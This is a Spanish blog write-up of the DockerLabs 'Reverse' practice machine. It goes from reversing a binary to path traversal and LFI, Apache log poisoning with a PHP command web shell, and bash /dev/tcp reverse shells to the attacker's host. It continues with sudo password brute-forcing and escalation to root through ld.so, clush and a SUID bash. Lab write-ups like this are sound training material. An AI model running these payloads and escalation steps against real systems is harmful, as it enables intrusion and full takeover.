---
title: DockerLabs - Reverse
summary: "Write-up del laboratorio Reverse de DockerLabs"
author: elcybercurioso
date: 2026-01-04
categories: [Post, DockerLabs]
tags: [medio, reverse engineering, information leakage, directory path traversal, lfi, log poisoning, brute force, file permissions, binary abuse, sudo]
media_subpath: "/assets/img/posts/dockerlabs_reverse"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ nmap -sCV -p80 172.17.0.2                          
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: P\xC3\xA1gina Interactiva
```

## análisis

Comenzamos revisando la pantalla principal:

![Desktop View](/20251118144642.webp){: width="972" height="589" .shadow}

En el código encontramos que hay definida una funcionalidad que si hacemos 20 clicks, se nos muestra en una ventana emergente el texto `secret_dir`:

![Desktop View](/20251118144741.webp){: width="972" height="589" .shadow}

Por lo tanto, hacemos 20 clicks, y se nos muestra la ventana emergente:

![Desktop View](/20251118144720.webp){: width="972" height="589" .shadow}

Suponiendo se trata de un recurso del servidor web, accedemos y vemos que accedemos a un listado de ficheros, donde únicamente hay disponible un fichero:

![Desktop View](/20251118144813.webp){: width="972" height="589" .shadow}

Lo descargamos , y vemos que se trata de un ejecutable, por lo que le damos permisos de ejecución, y lo hacemos algunas pruebas para ver como funciona:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ file secret                     
secret: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=387271a4e7dae83df80c4ca4453a3163c48d834f, for GNU/Linux 3.2.0, not stripped

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ chmod +x secret

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ ./secret       
Introduzca la contraseña: test
Recibido...
Comprobando...
Contraseña incorrecta...
```

Viendo que nos está solicitando una contraseña, procedemos a descomprimir el ejecutable con **ghidra** para investigar a bajo nivel como funciona, ya que es posible que la contraseña se encuentre dentro del mismo binario:

![Desktop View](/20251118174303.webp){: width="972" height="589" .shadow}

Encontramos algunas variables que se están empleando en la función **containsRequiredChars**, las cuales contienen valores ya definidos:

![Desktop View](/20251118184445.webp){: width="972" height="589" .shadow}

Procedemos a concatenar estos valores, y vemos que se trata de la contraseña correcta, por lo que ahora nos devuelve una cadena codificada en Base64:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ ./secret     
Introduzca la contraseña: @M***********
Recibido...
Comprobando...
Contraseña correcta, mensaje secreto:
ZzAw**********************==
```

Al decodificar esta cadena, vemos que el resultado parecería ser un subdominio:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ echo "ZzAw**********************==" | base64 -d; echo
g******.r******.dl
```

Por ello, lo agregamos al `/etc/hosts` de nuestra máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ cat /etc/hosts                  
...
172.17.0.2      g******.r******.dl
...
```

Una vez modificado el `/etc/hosts`, accedemos al subdomino:

![Desktop View](/20251118184950.webp){: width="972" height="589" .shadow}

Tras revisar las funcionalidades que ofrece, encontramos uno (**Experimentos Interactivos**) el cual está cargando lo que parecen ser ficheros del sistema:

![Desktop View](/20251118185125.webp){: width="972" height="589" .shadow}

Probamos a realizar un ataque **Path Traversal Attack** (movernos lateralmente como si estuviéramos en una consola) y un **LFI** (Local File Inclusion, incluir ficheros del sistema en el navegador) para ver si podemos llegar a ver ficheros del sistema, y vemos que es vulnerable:

```bash
http://g******.r******.dl/experiments.php?module=../../../../../../../../etc/passwd
```

![Desktop View](/20251118185039.webp){: width="972" height="589" .shadow}

Podemos en este caso ver los usuarios que tienen asignada una bash en el sistema:

```bash
root:x:0:0:root:/root:/bin/bash
...
maci:x:1000:1000:macimo,,,:/home/maci:/bin/bash
nova:x:1001:1001:nova,,,:/home/nova:/bin/bash
```

Revisando que ficheros del sistema podemos emplear para ganar acceso, encontramos que los logs de Apache son visibles, y vemos que todas las peticiones guardan un registro en los logs:

![Desktop View](/20251118190248.webp){: width="972" height="589" .shadow}

Debido a esto, probaremos a ver si el sistema es vulnerable a un **Log Poisoning** (ejecutar comandos indicando instrucciones maliciosas en los logs que se pueden ver desde el navegador).

Lo primero es interceptar una petición con **Burp Suite**, y mandarla al **Repeater**:

![Desktop View](/20251118190159.webp){: width="972" height="589" .shadow}

Seguiremos modificando el valor de la cabecera **User-Agent** para indicar una instrucción que podamos posteriormente emplear para ejecutar comandos:

![Desktop View](/20251118190345.webp){: width="972" height="589" .shadow}

```bash
<?php system($_GET['cmd']); ?>
```

Una vez enviada la petición que hemos modificado, volvemos a la pestaña anterior, y concatenamos el parámetro `cmd` y como valor, el comando que queramos ejecutar:

```bash
view-source:http://g******.r******.dl/experiments.php?module=../../../../../../../../var/log/apache2/access.log&cmd=id
```

![Desktop View](/20251118190440.webp){: width="972" height="589" .shadow}

Viendo que es posible ejecutar comandos, procedemos a obtener una consola, poniéndonos lo primero en escucha con **nc**:

```bash
view-source:http://g******.r******.dl/experiments.php?module=../../../../../../../../var/log/apache2/access.log&cmd=bash -c "bash -i >%26 /dev/tcp/<nuestra IP>/<nuestro puerto> 0>%261"
```

Si todo ha ido correctamente, deberíamos haber obtenido la consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 49496
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ whoami
whoami
www-data
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ hostname -I
hostname -I
172.17.0.2
```

Procedemos a tratar la TTY para poder operar con más facilidad:

```bash
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Reverse]
└─$ stty raw -echo;fg                               
[1]  + continued  nc -nlvp 4444
                               reset xterm
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ export TERM=xterm
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ export SHELL=bash
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ stty rows 49 columns 210
```

## movimiento lateral (nova)

Revisamos los permisos SUDO del usuario `www-data`, y vemos que podemos ejecutar el binario `/opt/password_nova` como el usuario `nova`:

```bash
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ sudo -l
Matching Defaults entries for www-data on 56147b4e2903:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 56147b4e2903:
    (nova : nova) NOPASSWD: /opt/password_nova
```

Comprobamos qué permisos tiene dicho binario:

```bash
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ ls -la /opt/password_nova
-rwx--x--x 1 nova nova 400 Dec 22  2024 /opt/password_nova
```

Y lo ejecutamos para ver qué es lo que nos permite hacer:

```bash
┌──[www-data@56147b4e2903]─[/var/www/subdominio]
└──╼ $ sudo -u nova /opt/password_nova
Escribe la contraseña (Pista: se encuentra en el rockyou ;) ): 
Contraseña incorrecta.
```

Dado que nos pide una clave, y la pista indica que se encuentra en el fichero **rockyou.txt**, procedemos a enviarlo a la máquina víctima para tratar de obtenerla por fuerza bruta.

Nos movemos a la ubicación en la que tengamos el rockyou.txt, y abrimos un servidor web con python:

```bash
┌──(elcybercurioso㉿kalilinux)-[/usr/share/seclists/Passwords]
└─$ python3 -m http.server 80                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la máquina víctima lo obtenemos con `wget`:

```bash
┌──[www-data@56147b4e2903]─[/tmp]
└──╼ $ wget http://172.17.0.1/rockyou.txt
```

Una vez dentro, ejecutamos el siguiente comando, el cual se encargará de ejecutar el binario con permisos SUDO por cada línea del rockyou.txt, y en caso de que no dé un error, nos mostrará un mensaje por pantalla indicando la clave correcta. Pasado un rato, veremos que nos indicará cual es la clave correcta:

```bash
┌──[www-data@56147b4e2903]─[/tmp]
└──╼ $ cat rockyou.txt | while read line; do echo "$line" | sudo -u nova /opt/password_nova &>/dev/null && echo "[+] Password: $line"; done
[+] Password: c********
```

Probamos a ver si realmente es la clave correcta, y dado que es correcta, nos indica cual es la contraseña del usuario `nova`:

```bash
┌──[www-data@56147b4e2903]─[/tmp]
└──╼ $ sudo -u nova /opt/password_nova 
Escribe la contraseña (Pista: se encuentra en el rockyou ;) ): c********
Contraseña correcta, mi contraseña es: B***********************
```

Teniendo ya la contraseña del usuario `nova`, nos conectamos como dicho usuario:

```bash
┌──[www-data@56147b4e2903]─[/tmp]
└──╼ $ su nova
Password: 
┌─[nova@56147b4e2903]─[/tmp]
└──╼ $whoami
nova
```

## movimiento lateral (maci)

Veremos en los permisos SUDO del usuario `nova` que podemos ejecutar el binario `/lib64/ld-linux-x86-64.so.2` como el usuario `maci` sin proporcionar contraseña:

```bash
┌─[nova@56147b4e2903]─[/tmp]
└──╼ $sudo -l
Matching Defaults entries for nova on 56147b4e2903:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nova may run the following commands on 56147b4e2903:
    (maci : maci) NOPASSWD: /lib64/ld-linux-x86-64.so.2
```

 En [GTFOBins](https://gtfobins.github.io/gtfobins/ld.so/#sudo) nos indican que podemos obtener una consola como otro usuario empleando el siguiente comando:

![Desktop View](/20251118193429.webp){: width="972" height="589" .shadow}

Probamos a ver si podemos obtener una consola como el usuario `maci`, y vemos que la obtenemos correctamente:

```bash
┌─[nova@56147b4e2903]─[/tmp]
└──╼ $sudo -u maci /lib64/ld-linux-x86-64.so.2 /bin/bash
┌─[maci@56147b4e2903]─[/tmp]
└──╼ $whoami
maci
```

## escalada de privilegios (root)

El usuario `maci` vemos que también tiene permisos SUDO asignados, que en este caso son para el binario `/usr/bin/clush` con los permisos del usuario `root`:

```bash
┌─[maci@56147b4e2903]─[/tmp]
└──╼ $sudo -l
Matching Defaults entries for maci on 56147b4e2903:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on 56147b4e2903:
    (ALL : ALL) NOPASSWD: /usr/bin/clush
```

Trasteando con este binario, llegamos a la conclusión de que para obtener una consola, debemos hacerlo ejecutando un comando para obtener una reverse shell:

```bash
┌─[maci@56147b4e2903]─[/var/www/subdominio]
└──╼ $sudo /usr/bin/clush -R exec -w example100 "bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/7777 0>&1'"
```

Habiéndonos puesto en escucha, y tras ejecutar el comando anterior, deberíamos haber obtenido una consola como el usuario `root`:

```bash
┌──(elcybercurioso㉿kalilinux)-[/usr/share/seclists/Passwords]
└─$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 34022
┌─[root@56147b4e2903]─[/var/www/subdominio]
└──╼ #whoami
whoami
root
```

Otra manera de obtener acceso como el usuario `root` es cambiar los permisos del binario `/bin/bash` para que sea **SUID** (para que el propio binario nos permita ejecutarlo con los permisos del propietario):

```bash
┌─[✗]─[maci@56147b4e2903]─[/var/www/subdominio]
└──╼ $ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
┌─[maci@56147b4e2903]─[/var/www/subdominio]
└──╼ $sudo /usr/bin/clush -R exec -w example100 "chmod u+s /bin/bash"                                                                                                                                                                             
┌─[maci@56147b4e2903]─[/var/www/subdominio]
└──╼ $ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
┌─[maci@56147b4e2903]─[/var/www/subdominio]
└──╼ $bash -p                                                                                                                                                                                                                                                
bash-5.2# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>